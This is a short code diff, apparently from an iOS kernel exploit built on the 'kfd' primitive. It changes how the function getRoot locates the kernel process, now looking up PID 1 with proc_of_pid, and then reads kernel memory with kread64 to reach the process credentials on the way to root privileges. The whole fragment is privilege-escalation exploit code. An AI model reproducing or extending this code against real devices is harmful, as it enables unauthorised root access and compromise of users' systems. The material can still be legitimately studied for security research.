@@ -360,7 +360,7 @@ void getRoot(u64 kfd, uint64_t proc_addr)
     printf("ucred @ 0x%llx\n", self_ucred);
     printf("test_uid = %d\n", getuid());
 
-    uint64_t kernproc = kfd_struct->info.kernel.kernel_proc;
+    uint64_t kernproc = proc_of_pid(kfd, 1);
     printf("kern proc @ %llx\n", kernproc);
     uint64_t kern_ro = kread64(kfd, kernproc + 0x20);
     printf("kern_ro @ 0x%llx\n", kern_ro);
